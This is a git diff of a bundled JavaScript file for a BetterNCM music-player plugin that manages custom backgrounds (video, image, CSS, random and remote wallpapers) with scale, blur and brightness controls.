WeakMap,L(Y1,"backgroundTypeName","\u89C6\u9891");var V2=[Y1,z1,$1,q1,Q1,U1,P1,s1,k1];function M0(e){return M1(e,[],v=>JSON.parse(v).map(n=>{let o=V2.find(p=>p.name===n.type)?.default();return o&&Object.assign(o,n)}).filter(n=>n),v=>JSON.stringify(v.map(l=>({...l,type:V2.find(n=>l instanceof n)?.name}))))}document.body.classList.add("BGEnhanced");var Z1=localStorage["cc.microblock.prefab.transparency"]||!0,s0=document.createElement("div"),ht=document.createElement("div");ht.classList.add("BGEnhanced-BackgoundDom");var U;plugin.onLoad(e=>{U=e.mainPlugin,U.backgroundList=[],ReactDOM.render(h(A3,null),ht),document.body.appendChild(ht),Z1=="true"&&document.body.classList.toggle("use-prefab-transparency-style")});function K1({backgroundList:e,buttons:v,currentIDs:l=null,cache:n=!1}){function o(z,d){return h("span",{className:`bg-block ${(l==null?z.current:l.includes(z.id))&&"selected"}`},d,h("div",{className:"info"},h("div",{className:"name"},z.constructor.backgroundTypeName),h("div",{className:"buttons"},v(z))))}let[p,u]=React.useState([]);return React.useEffect(()=>{let z=[];for(let d in e){let M=e[d],I=p.find(([C,R])=>M===R&&JSON.stringify(M)===JSON.stringify(R));n&&I!==void 0?z.push(I):(z.push([null,M]),M.previewBackground().then(C=>{u(R=>R.map(G=>G[1]===M?[React.memo(C),M]:G))}))}u(z)},[e]),h(f,null,e.filter((z,d)=>p[d]?.[0]).map((z,d)=>o(z,(0,p0.createElement)(p[d]?.[0]))))}function A3(){let e=React.useMemo(()=>betterncm_native.fs.readFileText(`${plugin.pluginPath}/index.css`),[]),[v,l]=React.useState({height:window.innerHeight,width:window.innerWidth});React.useEffect(()=>{function s(){l(w=>{let B={height:window.innerHeight,width:window.innerWidth};return B.width!==w.width||B.height!==w.height?B:w})}window.addEventListener("resize",s)});let[n,o]=M1(i0,1),[p,u]=M1(d0,1),[z,d]=M1(o0,0),[M,I]=M1(l0,"cover-centered"),[C,R]=M0(v0),[G,v1]=React.useState(C.find(s=>s.current)?.id??null);React.useEffect(()=>{U.backgroundList=C},[C]);let O=React.useMemo(()=>C.find(s=>s.current)??C[0]??new z1("linear-gradient(45deg, #0037ff, #005aff)"),[G]),[t1,A]=React.useState(null),[a1]=c0(React.useMemo(()=>O.backgroundElement(),[C]),[C]),y=React.useRef(null),m=async()=>{if(y.current&&y.current.firstElementChild){let s=y.current.firstElementChild;s.setAttribute("style","");let{width:w,height:B}=s.getClientRects()[0];if(s.style.position="relative",M==="cover"){let P=Math.max(v.width/w,v.height/B);s.style.width=`${w*P}px`,s.style.height=`${B*P}px`}if(M==="cover-centered"){let P=Math.max(v.width/w,v.height/B);s.style.width=`${w*P}px`,s.style.height=`${B*P}px`,s.style.marginLeft=`-${(w*P-v.width)/2}px`,s.style.marginTop=`-${(B*P-v.height)/2}px`}M==="stretch"&&(s.style.objectFit="fill",s.style.width=`${v.width}px`,s.style.height=`${v.height}px`)}};n0(m,1e4),React.useEffect(()=>{m()},[v,M,a1]),window.addEventListener("load",()=>m());async function l1(s){let w=await s.askAndCreate();for(let B of C)B.hooks__onBeforeAddBackground(w);w!=null&&R(C.concat([w]))}function m2(s){for(let w of C)w.hooks__onBeforeRemoveBackground(s);R(C.filter(w=>w!==s))}function J1(s){v1(s.id),R(C.map(w=>(w===s?w.current=!0:w.current=!1,w)))}function h1({name:s,id:w}){return h("span",{className:`btn ${M===w&&"enabled"}`,onClick:()=>I(w)},s)}function X1(){Z1=Z1?"false":"true",localStorage["cc.microblock.prefab.transparency"]=Z1,Z1&&document.body.classList.toggle("use-prefab-transparency-style")}return h(f,null,h("div",{style:{transform:`scale(${n})`,filter:`blur(${z}px) brightness(${p})`},className:`background mode-${M}`,ref:y},a1),h("style",{className:"BGEnhanced-styles"},e),ReactDOM.createPortal(h(f,null,h("div",{className:"BGEnhanced-Config"},t1||h(f,null,h("div",{className:"buttons"},h("span",{className:"full expand-h u-ibtn5"},h("span",{className:"ico"},h(a0,null)),h("span",{className:"content"},V2.map(s=>h("span",{className:"btn",onClick:()=>l1(s)},s.backgroundTypeName)))),h("span",{className:"extendable u-ibtn5"},h("span",{className:"ico"},h(h0,null)),h("span",{className:"content"},h(h1,{name:"\u8986\u76D6",id:"cover"}),h(h1,{name:"\u8986\u76D6\u5C45\u4E2D",id:"cover-centered"}),h(h1,{name:"\u62C9\u4F38",id:"stretch"})))),h("div",{className:"universalOptions u-ibtn5",style:{width:"100%",height:"max-content",borderRadius:".5em",padding:".5em .6ex",opacity:"0.9",marginBottom:"1em"}},h("div",null,h("span",{style:{margin:".5em"}},"\u7F29\u653E"),h("input",{type:"range",className:"range",min:.8,max:1.4,step:.01,style:{width:"calc(100% - 3em)",padding:".5em"},onChange:s=>o(parseFloat(s.target.value)),defaultValue:n})),h("div",null,h("span",{style:{margin:".5em"}},"\u6A21\u7CCA"),h("input",{type:"range",className:"range",min:0,max:60,step:.1,style:{width:"calc(100% - 3em)",padding:".5em"},onChange:s=>d(parseFloat(s.target.value)),defaultValue:z})),h("div",null,h("span",{style:{margin:".5em"}},"\u660E\u5EA6"),h("input",{type:"range",className:"range",min:0,max:1,step:.01,style:{width:"calc(100% - 3em)",padding:".5em"},onChange:s=>u(parseFloat(s.target.value)),defaultValue:p}))),h("div",{className:"u-ibtn5",style:{width:"100%",height:"max-content",borderRadius:".8em",padding:".5em .6ex",opacity:"0.9",marginBottom:"1em"},onClick:()=>X1()},h("span",{className:"btn"},"\u4F7F\u7528/\u79FB\u9664\u9884\u5236\u5168\u900F\u660E")),h("div",{className:"backgrounds"},h(K1,{backgroundList:C,buttons:s=>h(f,null,h("span",{className:"btn",onClick:async()=>{await s.onConfig(),R([...C])}},h(t0,null)),h("span",{className:"btn",onClick:()=>m2(s)},h(Xt,null)),h("span",{className:"btn",onClick:()=>J1(s)},h(S1,null)))}))))),s0))}plugin.onConfig(()=>s0);})();
+`;
+  };
+  __publicField(MaskedBackground, "backgroundTypeName", "\u906E\u7F69\u80CC\u666F");
+  __publicField(MaskedBackground, "attributes", ["recursive"]);
+
+  // src/background/randomBackground.tsx
+  var import_sweetalert23 = __toESM(require_sweetalert2_all());
+  var _randBGElement, _randomBackground, randomBackground_fn;
+  var _RandomBackground = class extends RecursiveLockBackground {
+    constructor() {
+      super(...arguments);
+      __privateAdd(this, _randomBackground);
+      __publicField(this, "excludeList", []);
+      __privateAdd(this, _randBGElement, void 0);
+    }
+    async onConfig() {
+      const ConfigMenu = () => {
+        const [excludes, setExcludes] = React.useState(this.excludeList);
+        const currents = React.useMemo(
+          () => selfPlugin.backgroundList.map((bg) => bg.id).filter((id) => !excludes.includes(id)),
+          [excludes]
+        );
+        React.useEffect(() => {
+          this.excludeList = excludes;
+        }, [excludes]);
+        const checkBackground = (bg) => {
+          if (excludes.includes(bg.id))
+            setExcludes(excludes.filter((id) => id !== bg.id));
+          else
+            setExcludes([...excludes, bg.id]);
+        };
+        const filteredBGList = React.useMemo(
+          () => selfPlugin.backgroundList.filter((bg) => bg !== this),
+          []
+        );
+        return /* @__PURE__ */ h(f, null, /* @__PURE__ */ h(
+          BackgroundPreviewList,
+          {
+            backgroundList: filteredBGList,
+            currentIDs: currents,
+            buttons: (bg) => /* @__PURE__ */ h(f, null, /* @__PURE__ */ h(
+              "span",
+              {
+                className: "btn",
+                onClick: () => checkBackground(bg)
+              },
+              /* @__PURE__ */ h(MdSelectAll, { color: "white" })
+            ))
+          }
+        ));
+      };
+      const p = import_sweetalert23.default.fire({ title: "\u968F\u673A\u80CC\u666F\u8BBE\u7F6E", html: "<div id=RandBGConfigContainer class=BGEnhanced-Config style='font-size:.5em;' />" });
+      ReactDOM.render(/* @__PURE__ */ h(ConfigMenu, null), document.getElementById("RandBGConfigContainer"));
+      await p;
+      this.resetRecursiveCount();
+      return;
+    }
+    async previewBackground() {
+      if (this.checkRecursive())
+        return () => /* @__PURE__ */ h("div", null, "Potential circular reference detected.");
+      return (await __privateMethod(this, _randomBackground, randomBackground_fn).call(this)).previewBackground();
+    }
+    async backgroundElement() {
+      if (this.checkRecursive())
+        return /* @__PURE__ */ h("div", null, "Potential circular reference detected.");
+      return (await __privateMethod(this, _randomBackground, randomBackground_fn).call(this)).backgroundElement();
+    }
+    static default() {
+      return new _RandomBackground();
+    }
+    static async askAndCreate() {
+      const bg = new _RandomBackground();
+      bg.excludeList = [...selfPlugin.backgroundList.filter((background) => background.constructor.attributes.includes("recursive")).map((bg2) => bg2.id)];
+      return bg;
+    }
+    hooks__onBeforeAddBackground(background) {
+      if (background.constructor.attributes.includes("recursive"))
+        this.excludeList.push(background.id);
+    }
+    hooks__onBeforeRemoveBackground(background) {
+      this.excludeList = this.excludeList.filter((id) => background.id !== id);
+    }
+  };
+  var RandomBackground = _RandomBackground;
+  _randBGElement = new WeakMap();
+  _randomBackground = new WeakSet();
+  randomBackground_fn = async function() {
+    if (!__privateGet(this, _randBGElement)) {
+      __privateSet(this, _randBGElement, Promise.race([
+        betterncm.utils.waitForFunction(() => selfPlugin.backgroundList.length),
+        betterncm.utils.delay(1e3).then((_) => Promise.reject("Timeout"))
+      ]).then(() => selfPlugin.backgroundList.filter((bg) => {
+        return bg !== this && !this.excludeList.includes(bg.id);
+      }).sort((_) => Math.random() - 0.5)[0]));
+    }
+    return __privateGet(this, _randBGElement);
+  };
+  __publicField(RandomBackground, "backgroundTypeName", "\u968F\u673A\u62BD\u9009");
+  __publicField(RandomBackground, "attributes", ["recursive"]);
+
+  // src/background/remoteImageBackground.tsx
+  var import_sweetalert24 = __toESM(require_sweetalert2_all());
+  var _RemoteImageBackground = class extends BaseBackground {
+    constructor(ImageUrl) {
+      super();
+      this.ImageUrl = ImageUrl;
+    }
+    ImageUrl;
+    async backgroundElement() {
+      return /* @__PURE__ */ h(
+        "img",
+        {
+          src: this.ImageUrl
+        }
+      );
+    }
+    async previewBackground() {
+      return () => /* @__PURE__ */ h("div", { style: { background: `url(${this.ImageUrl}) 0% 0% / cover` } });
+    }
+    static default() {
+      return new _RemoteImageBackground("");
+    }
+    async onConfig() {
+      const result = await import_sweetalert24.default.fire({
+        title: "\u4FEE\u6539\u5728\u7EBF\u56FE\u7247\u80CC\u666FURL",
+        inputValue: this.ImageUrl,
+        input: "text"
+      });
+      if (result.value)
+        this.ImageUrl = result.value;
+      return;
+    }
+    static async askAndCreate() {
+      const result = await import_sweetalert24.default.fire({
+        title: "\u521B\u5EFA\u4E00\u4E2A\u5728\u7EBF\u56FE\u7247\u80CC\u666F",
+        text: "\u4F60\u53EF\u4EE5\u5728\u6B64\u5199\u5165\u4E00\u4E2A\u6307\u5411\u56FE\u7247\u7684URL\u3002",
+        input: "text"
+      });
+      if (result.value)
+        return new _RemoteImageBackground(result.value);
+      else
+        return null;
+    }
+  };
+  var RemoteImageBackground = _RemoteImageBackground;
+  __publicField(RemoteImageBackground, "backgroundTypeName", "\u5728\u7EBF\u56FE\u7247");
+
+  // src/background/remoteRandImageBackgroundLoli.tsx
+  var import_sweetalert25 = __toESM(require_sweetalert2_all());
+  var _RemoteRandImageBackgroundLoli = class extends RemoteImageBackground {
+    constructor(url) {
+      super(url);
+    }
+    static default() {
+      return new _RemoteRandImageBackgroundLoli("");
+    }
+    static async askAndCreate() {
+      import_sweetalert25.default.showLoading(null);
+      const redirectedUrl = await fetch("https://www.loliapi.com/acg/pc/");
+      import_sweetalert25.default.clickCancel();
+      return new _RemoteRandImageBackgroundLoli(redirectedUrl.url);
+    }
+  };
+  var RemoteRandImageBackgroundLoli = _RemoteRandImageBackgroundLoli;
+  __publicField(RemoteRandImageBackgroundLoli, "backgroundTypeName", "\u968F\u673A\u4E8C\u6B21\u5143");
+
+  // src/background/remoteRandImageBackgroundScenery.tsx
+  var _RemoteRandImageBackgroundScenery = class extends BaseBackground {
+    ImageUrl = "https://api.dujin.org/bing/1920.php";
+    constructor() {
+      super();
+    }
+    async backgroundElement() {
+      return /* @__PURE__ */ h(
+        "img",
+        {
+          src: `${this.ImageUrl}?${new Date().getTime()}`
+        }
+      );
+    }
+    async previewBackground() {
+      return () => /* @__PURE__ */ h("div", { style: { background: `url(${this.ImageUrl}?${new Date().getTime()}) 0% 0% / cover` } });
+    }
+    static default() {
+      return new _RemoteRandImageBackgroundScenery();
+    }
+    static async askAndCreate() {
+      return new _RemoteRandImageBackgroundScenery();
+    }
+  };
+  var RemoteRandImageBackgroundScenery = _RemoteRandImageBackgroundScenery;
+  __publicField(RemoteRandImageBackgroundScenery, "backgroundTypeName", "\u5FC5\u5E94\u6BCF\u65E5");
+
+  // src/background/videoBackground.tsx
+  var _mountedVideoUrl;
+  var _VideoBackground = class extends BaseBackground {
+    constructor(videoUrl) {
+      super();
+      __publicField(this, "videoUrl");
+      __privateAdd(this, _mountedVideoUrl, void 0);
+      this.videoUrl = videoUrl;
+    }
+    async getMountedVideoUrl() {
+      if (__privateGet(this, _mountedVideoUrl) === void 0)
+        __privateSet(this, _mountedVideoUrl, betterncm.fs.mountFile(this.videoUrl));
+      return await __privateGet(this, _mountedVideoUrl);
+    }
+    async backgroundElement() {
+      return /* @__PURE__ */ h(
+        "video",
+        {
+          autoPlay: true,
+          loop: true,
+          muted: true,
+          src: await this.getMountedVideoUrl()
+        }
+      );
+    }
+    async previewBackground() {
+      const url = await this.getMountedVideoUrl();
+      return () => /* @__PURE__ */ h("video", { preload: "metadata", src: url });
+    }
+    static default() {
+      return new _VideoBackground("");
+    }
+    static async askAndCreate() {
+      const path = await betterncm.app.openFileDialog(".mp4, .webm\0", "./");
+      if (path)
+        return new _VideoBackground(path);
+      return null;
+    }
+  };
+  var VideoBackground = _VideoBackground;
+  _mountedVideoUrl = new WeakMap();
+  __publicField(VideoBackground, "backgroundTypeName", "\u89C6\u9891");
+
+  // src/backgroundList.ts
+  var BackgroundTypes = [VideoBackground, CSSBackground, ImageBackground, RemoteRandImageBackgroundLoli, RemoteRandImageBackgroundScenery, CoverImageBackground, RandomBackground, RemoteImageBackground, MaskedBackground];
+  function useLocalStorageBackgroundList(key) {
+    return useLocalStorage(
+      key,
+      [],
+      (s) => {
+        const obj = JSON.parse(s);
+        return obj.map((value) => {
+          const def = BackgroundTypes.find(
+            (type) => type.name === value.type
+          )?.default();
+          return def && Object.assign(def, value);
+        }).filter((v) => v);
+      },
+      (s) => {
+        return JSON.stringify(
+          s.map((v) => ({
+            ...v,
+            type: BackgroundTypes.find((type) => v instanceof type)?.name
+          }))
+        );
+      }
+    );
+  }
+
+  // src/index.tsx
+  document.body.classList.add("BGEnhanced");
+  var prefabTransparencyStatus = localStorage["cc.microblock.prefab.transparency"] || true;
+  var configElement = document.createElement("div");
+  var BGDom = document.createElement("div");
+  BGDom.classList.add("BGEnhanced-BackgoundDom");
+  var selfPlugin;
+  plugin.onLoad((_selfPlugin) => {
+    selfPlugin = _selfPlugin.mainPlugin;
+    selfPlugin.backgroundList = [];
+    ReactDOM.render(/* @__PURE__ */ h(Main, null), BGDom);
+    document.body.appendChild(BGDom);
+    if (prefabTransparencyStatus == "true")
+      document.body.classList.toggle("use-prefab-transparency-style");
+  });
+  function BackgroundPreviewList({
+    backgroundList,
+    buttons,
+    currentIDs = null,
+    cache = true
+  }) {
+    function PreviewBackground(background, preview) {
+      return /* @__PURE__ */ h("span", { className: `bg-block ${(currentIDs == null ? background.current : currentIDs.includes(background.id)) && "selected"}` }, preview, /* @__PURE__ */ h("div", { className: "info" }, /* @__PURE__ */ h("div", { className: "name" }, background.constructor.backgroundTypeName), /* @__PURE__ */ h("div", { className: "buttons" }, buttons(background))));
+    }
+    const [backgroundPreviewList, setBackgroundPreviewList] = React.useState([]);
+    React.useEffect(() => {
+      const previewList = [];
+      for (const backgroundIndex in backgroundList) {
+        const background = backgroundList[backgroundIndex];
+        const previous = backgroundPreviewList.find(([_, base]) => background === base && JSON.stringify(background) === JSON.stringify(base));
+        if (cache && previous !== void 0) {
+          previewList.push(previous);
+        } else {
+          previewList.push([null, background]);
+          background.previewBackground().then((preview) => {
+            setBackgroundPreviewList((prev) => prev.map((previewVal) => {
+              if (previewVal[1] === background) {
+                console.log("BGE Preview:", preview);
+                if (preview)
+                  return [React.memo(preview), background];
+              }
+              return previewVal;
+            }));
+          });
+        }
+      }
+      setBackgroundPreviewList(previewList);
+    }, [backgroundList]);
+    return /* @__PURE__ */ h(f, null, backgroundList.filter((v, i) => backgroundPreviewList[i]?.[0]).map((v, i) => PreviewBackground(v, (0, import_react3.createElement)(backgroundPreviewList[i]?.[0]))));
+  }
+  function Main() {
+    const stylesheet = React.useMemo(
+      () => betterncm_native.fs.readFileText(`${plugin.pluginPath}/index.css`),
+      []
+    );
+    const [dimensions, setDimensions] = React.useState({
+      height: window.innerHeight,
+      width: window.innerWidth
+    });
+    React.useEffect(() => {
+      function handleResize() {
+        setDimensions((dimensions2) => {
+          const newDimension = {
+            height: window.innerHeight,
+            width: window.innerWidth
+          };
+          if (newDimension.width !== dimensions2.width || newDimension.height !== dimensions2.height)
+            return newDimension;
+          return dimensions2;
+        });
+      }
+      window.addEventListener("resize", handleResize);
+    });
+    const [backgroundScale, setBackgroundScale] = useLocalStorage(
+      STORE_BGSCALE,
+      1
+    );
+    const [backgroundBrightness, setBackgroundBrightness] = useLocalStorage(
+      STORE_BGBRIGHTNESS,
+      1
+    );
+    const [backgroundBlur, setBackgroundBlur] = useLocalStorage(
+      STORE_BGBLUR,
+      0
+    );
+    const [backgroundMode, setBackgroundMode] = useLocalStorage(
+      STORE_BGMODE,
+      "cover-centered"
+    );
+    const [backgroundList, setBackgroundList] = useLocalStorageBackgroundList(STORE_BGLIST);
+    const [currentBackgroundId, setCurrentBackgroundId] = React.useState(backgroundList.find((bg) => bg.current)?.id ?? null);
+    React.useEffect(() => {
+      selfPlugin.backgroundList = backgroundList;
+    }, [backgroundList]);
+    const currentBackground = React.useMemo(() => {
+      return backgroundList.find((bg) => bg.current) ?? backgroundList[0] ?? new CSSBackground("linear-gradient(45deg, #0037ff, #005aff)");
+    }, [currentBackgroundId]);
+    const [currentConfigBackground, setCurrentConfigBackground] = React.useState(null);
+    const [currentBackgroundElement] = usePromise(
+      React.useMemo(() => currentBackground.backgroundElement(), [currentBackgroundId]),
+      [currentBackgroundId]
+    );
+    const backgroundParentRef = React.useRef(null);
+    const recalcBGSize = async () => {
+      if (backgroundParentRef.current && backgroundParentRef.current.firstElementChild) {
+        const bgDom = backgroundParentRef.current.firstElementChild;
+        bgDom.setAttribute("style", "");
+        const { width, height } = bgDom.getClientRects()[0];
+        bgDom.style.position = "relative";
+        if (backgroundMode === "cover") {
+          const scale = Math.max(dimensions.width / width, dimensions.height / height);
+          bgDom.style.width = `${width * scale}px`;
+          bgDom.style.height = `${height * scale}px`;
+        }
+        if (backgroundMode === "cover-centered") {
+          const scale = Math.max(dimensions.width / width, dimensions.height / height);
+          bgDom.style.width = `${width * scale}px`;
+          bgDom.style.height = `${height * scale}px`;
+          bgDom.style.marginLeft = `-${(width * scale - dimensions.width) / 2}px`;
+          bgDom.style.marginTop = `-${(height * scale - dimensions.height) / 2}px`;
+        }
+        if (backgroundMode === "stretch") {
+          bgDom.style.objectFit = "fill";
+          bgDom.style.width = `${dimensions.width}px`;
+          bgDom.style.height = `${dimensions.height}px`;
+        }
+      }
+    };
+    useInterval(recalcBGSize, 1e4);
+    React.useEffect(() => {
+      setTimeout(() => recalcBGSize());
+    }, [dimensions, backgroundMode, currentBackgroundElement, currentBackgroundId]);
+    React.useEffect(() => {
+      setTimeout(() => recalcBGSize(), 100);
+    }, [currentBackgroundId]);
+    window.addEventListener("load", () => recalcBGSize());
+    async function askAndAddBackground(background) {
+      const result = await background.askAndCreate();
+      for (const bg of backgroundList)
+        bg.hooks__onBeforeAddBackground(result);
+      if (result != null)
+        setBackgroundList(backgroundList.concat([result]));
+    }
+    function removeBackground(background) {
+      for (const bg of backgroundList)
+        bg.hooks__onBeforeRemoveBackground(background);
+      setBackgroundList(backgroundList.filter((bg) => bg !== background));
+    }
+    function selectBackground(background) {
+      setCurrentBackgroundId(background.id);
+      setBackgroundList(
+        backgroundList.map((bg) => {
+          if (bg === background)
+            bg.current = true;
+          else
+            bg.current = false;
+          return bg;
+        })
+      );
+    }
+    function BackgroundModeElement({ name, id }) {
+      return /* @__PURE__ */ h(
+        "span",
+        {
+          className: `btn ${backgroundMode === id && "enabled"}`,
+          onClick: () => setBackgroundMode(id)
+        },
+        name
+      );
+    }
+    function usePrefabTransparencyStyle() {
+      prefabTransparencyStatus = prefabTransparencyStatus ? "false" : "true";
+      localStorage["cc.microblock.prefab.transparency"] = prefabTransparencyStatus;
+      if (prefabTransparencyStatus)
+        document.body.classList.toggle("use-prefab-transparency-style");
+    }
+    return /* @__PURE__ */ h(f, null, /* @__PURE__ */ h(
+      "div",
+      {
+        style: {
+          transform: `scale(${backgroundScale})`,
+          filter: `blur(${backgroundBlur}px) brightness(${backgroundBrightness})`
+        },
+        className: `background mode-${backgroundMode}`,
+        ref: backgroundParentRef
+      },
+      currentBackgroundElement
+    ), /* @__PURE__ */ h("style", { className: "BGEnhanced-styles" }, stylesheet), ReactDOM.createPortal(
+      /* @__PURE__ */ h(f, null, /* @__PURE__ */ h("div", { className: "BGEnhanced-Config" }, currentConfigBackground ? currentConfigBackground : /* @__PURE__ */ h(f, null, /* @__PURE__ */ h("div", { className: "buttons" }, /* @__PURE__ */ h("span", { className: "full expand-h u-ibtn5" }, /* @__PURE__ */ h("span", { className: "ico" }, /* @__PURE__ */ h(MdAdd, null)), /* @__PURE__ */ h("span", { className: "content" }, BackgroundTypes.map((type) => // rome-ignore lint/a11y/useKeyWithClickEvents: <explanation>
+      /* @__PURE__ */ h(
+        "span",
+        {
+          className: "btn",
+          onClick: () => askAndAddBackground(type)
+        },
+        type.backgroundTypeName
+      )))), /* @__PURE__ */ h("span", { className: "extendable u-ibtn5" }, /* @__PURE__ */ h("span", { className: "ico" }, /* @__PURE__ */ h(MdDesktopWindows, null)), /* @__PURE__ */ h("span", { className: "content" }, /* @__PURE__ */ h(BackgroundModeElement, { name: "\u8986\u76D6", id: "cover" }), /* @__PURE__ */ h(BackgroundModeElement, { name: "\u8986\u76D6\u5C45\u4E2D", id: "cover-centered" }), /* @__PURE__ */ h(BackgroundModeElement, { name: "\u62C9\u4F38", id: "stretch" })))), /* @__PURE__ */ h("div", { className: "universalOptions u-ibtn5", style: {
+        width: "100%",
+        height: "max-content",
+        borderRadius: ".5em",
+        padding: ".5em .6ex",
+        opacity: "0.9",
+        marginBottom: "1em"
+      } }, /* @__PURE__ */ h("div", null, /* @__PURE__ */ h("span", { style: { margin: ".5em" } }, "\u7F29\u653E"), /* @__PURE__ */ h(
+        "input",
+        {
+          type: "range",
+          className: "range",
+          min: 0.8,
+          max: 1.4,
+          step: 0.01,
+          style: { width: "calc(100% - 3em)", padding: ".5em" },
+          onChange: (e) => setBackgroundScale(parseFloat(e.target.value)),
+          defaultValue: backgroundScale
+        }
+      )), /* @__PURE__ */ h("div", null, /* @__PURE__ */ h("span", { style: { margin: ".5em" } }, "\u6A21\u7CCA"), /* @__PURE__ */ h(
+        "input",
+        {
+          type: "range",
+          className: "range",
+          min: 0,
+          max: 60,
+          step: 0.1,
+          style: { width: "calc(100% - 3em)", padding: ".5em" },
+          onChange: (e) => setBackgroundBlur(parseFloat(e.target.value)),
+          defaultValue: backgroundBlur
+        }
+      )), /* @__PURE__ */ h("div", null, /* @__PURE__ */ h("span", { style: { margin: ".5em" } }, "\u660E\u5EA6"), /* @__PURE__ */ h(
+        "input",
+        {
+          type: "range",
+          className: "range",
+          min: 0,
+          max: 1,
+          step: 0.01,
+          style: { width: "calc(100% - 3em)", padding: ".5em" },
+          onChange: (e) => setBackgroundBrightness(parseFloat(e.target.value)),
+          defaultValue: backgroundBrightness
+        }
+      ))), /* @__PURE__ */ h(
+        "div",
+        {
+          className: "u-ibtn5",
+          style: {
+            width: "100%",
+            height: "max-content",
+            borderRadius: ".8em",
+            padding: ".5em .6ex",
+            opacity: "0.9",
+            marginBottom: "1em"
+          },
+          onClick: () => usePrefabTransparencyStyle()
+        },
+        /* @__PURE__ */ h("span", { className: "btn" }, "\u4F7F\u7528/\u79FB\u9664\u9884\u5236\u5168\u900F\u660E")
+      ), /* @__PURE__ */ h("div", { className: "backgrounds" }, /* @__PURE__ */ h(BackgroundPreviewList, { backgroundList, buttons: (background) => /* @__PURE__ */ h(f, null, /* @__PURE__ */ h("span", { className: "btn", onClick: async () => {
+        await background.onConfig();
+        setBackgroundList([...backgroundList]);
+      } }, /* @__PURE__ */ h(MdSettings, null)), /* @__PURE__ */ h(
+        "span",
+        {
+          className: "btn",
+          onClick: () => removeBackground(background)
+        },
+        /* @__PURE__ */ h(MdDelete, null)
+      ), /* @__PURE__ */ h(
+        "span",
+        {
+          className: "btn",
+          onClick: () => selectBackground(background)
+        },
+        /* @__PURE__ */ h(MdSelectAll, null)
+      )) }))))),
+      configElement
+    ));
+  }
+  plugin.onConfig(() => {
+    return configElement;
+  });
+})();
 /*! Bundled license information:
 
-react/cjs/react.production.min.js:
+react/cjs/react.development.js:
   (**
    * @license React
-   * react.production.min.js
+   * react.development.js
    *
    * Copyright (c) Facebook, Inc. and its affiliates.
    *
